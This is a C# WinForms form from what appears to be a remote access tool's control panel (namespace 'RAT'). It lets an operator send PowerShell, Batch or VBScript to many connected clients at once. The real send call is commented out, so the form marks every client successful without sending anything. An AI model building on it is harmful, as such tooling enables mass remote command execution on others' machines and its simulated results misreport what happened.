using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using System.Threading.Tasks;
using Newtonsoft.Json;
using RAT.Shared.Models;

namespace RAT.ControlPanel.Forms
{
    public partial class frmMultiRunScript : Form
    {
        private List<ClientInfo> clients;
        private MainForm mainForm;
        
        public frmMultiRunScript(List<ClientInfo> clients, MainForm mainForm)
        {
            this.clients = clients;
            this.mainForm = mainForm;
            InitializeComponent();
            this.Text = $"Multi Run Script - {clients.Count} Clients";
        }
        
        private void frmMultiRunScript_Load(object sender, EventArgs e)
        {
            SetupListView();
            lblStatus.Text = $"Clients: {clients.Count}";
            
            // 기본 스크립트 타입 선택
            comboScriptType.SelectedIndex = 0;
        }
        
        private void SetupListView()
        {
            listViewClients.Items.Clear();
            
            for (int i = 0; i < clients.Count; i++)
            {
                var client = clients[i];
                var item = new ListViewItem((i + 1).ToString());
                item.SubItems.Add(client.ClientId);
                item.SubItems.Add("Ready");
                item.SubItems.Add("");
                item.Tag = client;
                item.Checked = false;
                
                listViewClients.Items.Add(item);
            }
        }
        
        private async void btnExecute_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtScript.Text))
            {
                MessageBox.Show("Please enter a script to execute.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            
            var checkedClients = GetCheckedClients();
            if (checkedClients.Count == 0)
            {
                MessageBox.Show("Please select at least one client.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            
            string scriptType = comboScriptType.SelectedItem.ToString();
            string script = txtScript.Text;
            
            btnExecute.Enabled = false;
            progressBar.Value = 0;
            progressBar.Maximum = checkedClients.Count;
            
            foreach (var client in checkedClients)
            {
                UpdateClientStatus(client.ClientId, "Executing...", "");
                
                // 명령 전송 (실제 구현에서는 mainForm을 통해 전송)
                string commandType = scriptType switch
                {
                    "PowerShell" => "script_powershell",
                    "Batch" => "script_batch",
                    "VBScript" => "script_vbs",
                    _ => "script_powershell"
                };
                
                // await SendCommand(client, new { type = commandType, script = script });
                
                // 임시: 성공으로 표시
                UpdateClientStatus(client.ClientId, "Completed", "Success");
                progressBar.Value++;
                
                await Task.Delay(100); // 시뮬레이션
            }
            
            btnExecute.Enabled = true;
            MessageBox.Show($"Script executed on {checkedClients.Count} client(s).", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        
        private void btnCheckAll_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewClients.Items)
            {
                item.Checked = true;
            }
        }
        
        private void btnUncheckAll_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewClients.Items)
            {
                item.Checked = false;
            }
        }
        
        private void btnClear_Click(object sender, EventArgs e)
        {
            txtScript.Clear();
        }
        
        private void btnLoadTemplate_Click(object sender, EventArgs e)
        {
            string scriptType = comboScriptType.SelectedItem.ToString();
            
            string template = scriptType switch
            {
                "PowerShell" => "# PowerShell Script\nGet-Process | Select-Object Name, CPU, Memory\nWrite-Host \"Script completed\"",
                "Batch" => "@echo off\necho Running batch script...\ndir C:\\\necho Script completed\npause",
                "VBScript" => "' VBScript\nMsgBox \"Hello from VBScript!\"\nWScript.Echo \"Script completed\"",
                _ => ""
            };
            
            txtScript.Text = template;
        }
        
        private List<ClientInfo> GetCheckedClients()
        {
            var checkedClients = new List<ClientInfo>();
            
            foreach (ListViewItem item in listViewClients.CheckedItems)
            {
                if (item.Tag is ClientInfo client)
                {
                    checkedClients.Add(client);
                }
            }
            
            return checkedClients;
        }
        
        private void UpdateClientStatus(string clientId, string status, string result)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => UpdateClientStatus(clientId, status, result)));
                return;
            }
            
            foreach (ListViewItem item in listViewClients.Items)
            {
                if (item.Tag is ClientInfo client && client.ClientId == clientId)
                {
                    item.SubItems[2].Text = status;
                    item.SubItems[3].Text = result;
                    
                    // 색상 코딩
                    if (status == "Completed")
                    {
                        item.ForeColor = result.Contains("Success") ? Color.Green : Color.Red;
                    }
                    else if (status == "Executing...")
                    {
                        item.ForeColor = Color.Blue;
                    }
                    
                    break;
                }
            }
        }
        
        public void UpdateScriptResult(string clientId, bool success, string output)
        {
            UpdateClientStatus(clientId, "Completed", success ? $"Success: {output}" : $"Error: {output}");
        }
    }
}
